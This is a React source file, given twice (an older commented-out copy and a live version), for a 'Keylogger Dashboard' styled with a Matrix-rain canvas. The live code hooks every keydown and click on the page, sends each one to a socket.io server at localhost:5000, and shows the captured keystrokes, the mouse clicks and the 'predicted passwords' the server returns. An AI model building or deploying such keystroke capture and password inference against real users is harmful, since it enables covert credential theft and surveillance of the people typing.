// import React, { useEffect, useState } from 'react';
// import io from 'socket.io-client';
// import 'bootstrap/dist/css/bootstrap.min.css';
// import './App.css';

// const socket = io('http://localhost:5000');

// function App() {
//   const [keystrokes, setKeystrokes] = useState('');
//   const [mouseClicks, setMouseClicks] = useState([]);
//   const [predictedPasswords, setPredictedPasswords] = useState([]);
//   const [timer, setTimer] = useState(60);

//   useEffect(() => {
//     socket.on('keystroke_update', data => {
//       setKeystrokes(data.new_keystrokes);
//     });
//     socket.on('mouse_click_update', data => {
//       setMouseClicks(mc => [...mc, data.new_click]);
//     });
//     socket.on('password_prediction', data => {
//       setPredictedPasswords(data.predicted_passwords);
//     });

//     const interval = setInterval(() => {
//       setTimer(t => t > 0 ? t - 1 : 60);
//     }, 1000);

//     document.addEventListener('keydown', (event) => {
//       socket.emit('keystroke', { key: event.key });
//     });

//     document.addEventListener('click', (event) => {
//       socket.emit('mouse_click', { button: event.button, x: event.clientX, y: event.clientY });
//     });

//     return () => {
//       clearInterval(interval);
//       socket.off('keystroke_update');
//       socket.off('mouse_click_update');
//       socket.off('password_prediction');
//     };
//   }, []);

//   return (
//     <div className="container mt-5 text-center">
//       <h1 className="mb-5 neon-green">Keylogger Dashboard</h1>
//       <h2 className="mb-5 neon-green">Next update in {timer} seconds</h2>
//       <div className="row">
//         <div className="col-md-6 mb-4">
//           <div className="card bg-dark">
//             <div className="card-header">
//               <h2 className="neon-green">Keystrokes</h2>
//             </div>
//             <div className="card-body">
//               <p className="neon-green">{keystrokes}</p>
//             </div>
//           </div>
//         </div>
//         <div className="col-md-6 mb-4">
//           <div className="card bg-dark">
//             <div className="card-header">
//               <h2 className="neon-green">Mouse Clicks</h2>
//             </div>
//             <div className="card-body">
//               {mouseClicks.map((c, i) => <p key={i} className="mb-1 neon-green">{c}</p>)}
//             </div>
//           </div>
//         </div>
//       </div>
//       <div className="row">
//         <div className="col-md-12 mb-4">
//           <div className="card bg-dark">
//             <div className="card-header">
//               <h2 className="neon-green">Predicted Passwords</h2>
//             </div>
//             <div className="card-body">
//               {predictedPasswords.map((pp, i) => <p key={i} className="mb-1 neon-green">{pp}</p>)}
//             </div>
//           </div>
//         </div>
//       </div>
//     </div>
//   );
// }

// export default App;
import React, { useEffect, useState } from 'react';
import io from 'socket.io-client';
import 'bootstrap/dist/css/bootstrap.min.css';
import './App.css';

const socket = io('http://localhost:5000');

function App() {
  const [keystrokes, setKeystrokes] = useState('');
  const [mouseClicks, setMouseClicks] = useState([]);
  const [predictedPasswords, setPredictedPasswords] = useState([]);
  const [timer, setTimer] = useState(60);

  useEffect(() => {
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const matrix = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}';
    const font_size = 10;
    const columns = canvas.width / font_size;
    const drops = [];
    
    for (let x = 0; x < columns; x++) drops[x] = 1;

    function draw() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#00ff00';
      ctx.font = font_size + 'px arial';
      
      for (let i = 0; i < drops.length; i++) {
        const text = matrix[Math.floor(Math.random() * matrix.length)];
        ctx.fillText(text, i * font_size, drops[i] * font_size);
        
        if (drops[i] * font_size > canvas.height && Math.random() > 0.975) drops[i] = 0;
        
        drops[i]++;
      }
    }

    const intervalId = setInterval(draw, 35);

    socket.on('keystroke_update', data => {
      setKeystrokes(data.new_keystrokes);
    });
    socket.on('mouse_click_update', data => {
      setMouseClicks(mc => [...mc, data.new_click]);
    });
    socket.on('password_prediction', data => {
      setPredictedPasswords(data.predicted_passwords);
    });

    const timerInterval = setInterval(() => {
      setTimer(t => t > 0 ? t - 1 : 60);
    }, 1000);

    document.addEventListener('keydown', (event) => {
      socket.emit('keystroke', { key: event.key });
    });

    document.addEventListener('click', (event) => {
      socket.emit('mouse_click', { button: event.button, x: event.clientX, y: event.clientY });
    });

    return () => {
      clearInterval(intervalId);
      clearInterval(timerInterval);
      socket.off('keystroke_update');
      socket.off('mouse_click_update');
      socket.off('password_prediction');
    };
  }, []);

  return (
    <div className="container text-center">
      <canvas id="matrix"></canvas>
      <h1 className="mb-5 neon-green">Keylogger Dashboard</h1>
      <h2 className="mb-5 neon-green">Next update in {timer} seconds</h2>
      <div className="row">
        <div className="col-md-6 mb-4">
          <div className="card">
            <div className="card-header">
              <h2 className="neon-green">Keystrokes</h2>
            </div>
            <div className="card-body">
              <p className="neon-green">{keystrokes}</p>
            </div>
          </div>
        </div>
        <div className="col-md-6 mb-4">
          <div className="card">
            <div className="card-header">
              <h2 className="neon-green">Mouse Clicks</h2>
            </div>
            <div className="card-body">
              {mouseClicks.map((c, i) => <p key={i} className="mb-1 neon-green">{c}</p>)}
            </div>
          </div>
        </div>
      </div>
      <div className="row">
        <div className="col-md-12 mb-4">
          <div className="card">
            <div className="card-header">
              <h2 className="neon-green">Predicted Passwords</h2>
            </div>
            <div className="card-body">
              {predictedPasswords.map((pp, i) => <p key={i} className="mb-1 neon-green">Possible password: {pp}</p>)}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;


